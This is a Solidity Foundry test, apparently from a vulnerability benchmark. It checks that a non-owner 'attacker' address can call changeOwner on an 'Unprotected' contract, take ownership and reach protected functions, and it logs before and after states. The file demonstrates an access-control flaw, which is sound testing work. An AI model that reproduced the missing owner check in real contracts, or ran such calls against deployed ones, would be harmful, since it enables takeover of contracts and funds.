// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/unprotected0.sol";

contract UnprotectedTest is Test {
    Unprotected public unprotected;
    address public owner = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        vm.prank(owner);
        unprotected = new Unprotected();
    }

    function testNonOwnerCanChangeOwner() public {
        // Validate original owner can access protected function
        vm.prank(owner);
        unprotected.recordOwnershipActivity(); // Should succeed
        
        // --- BEFORE-Trigger State ---
        console2.log("--- BEFORE-Trigger State ---");
        uint256 preTotalChanges = unprotected.totalOwnershipChanges();
        uint256 preAttackCount = unprotected.ownershipChangesByAddress(attacker);
        
        console2.log("Initial ownership change count: %s", preTotalChanges);
        console2.log("Attacker's ownership count (pre-attack): %s", preAttackCount);
        console2.log("Original owner (%s) verified via auth action", owner);

        // --- Trigger Attack ---
        console2.log("--- TRIGGER: Attacker calling changeOwner(%s) ---", attacker);
        vm.prank(attacker);
        unprotected.changeOwner(attacker);  // This should not revert

        // --- AFTER-Trigger State ---
        console2.log("--- AFTER-Trigger State ---");
        uint256 postTotalChanges = unprotected.totalOwnershipChanges();
        uint256 postAttackCount = unprotected.ownershipChangesByAddress(attacker);
        
        console2.log("Updated ownership change count: %s", postTotalChanges);
        console2.log("Attacker's ownership count (post-trigger): %s", postAttackCount);

        // --- Vulnerability Verification ---
        console2.log("--- Vulnerability Validation ---");
        bool totalChangesIncreased = postTotalChanges > preTotalChanges;
        bool attackCountIncreased = postAttackCount > preAttackCount;
        
        console2.log("Total changes increased? %s", 
            totalChangesIncreased ? "YES" : "NO");
        console2.log("Attack count increased? %s", 
            attackCountIncreased ? "YES" : "NO");

        // --- Functional Validation ---
        console2.log("--- Functional Verification ---");
        vm.prank(attacker);
        unprotected.recordOwnershipActivity(); // Should succeed
        console2.log("Attacker can access protected function: YES");

        vm.prank(owner);
        try unprotected.recordOwnershipActivity() {
            console2.log("Old owner can access protected function: YES (Vulnerable)");
        } catch {
            console2.log("Old owner locked out: YES (Expected)");
        }

        // --- Final Verdict ---
        if (totalChangesIncreased && attackCountIncreased) {
            console2.log("Vulnerability Exists: State variables changed by non-owner");
        } else {
            console2.log("Vulnerability not Exist: State unchanged after attack");
        }
    }
}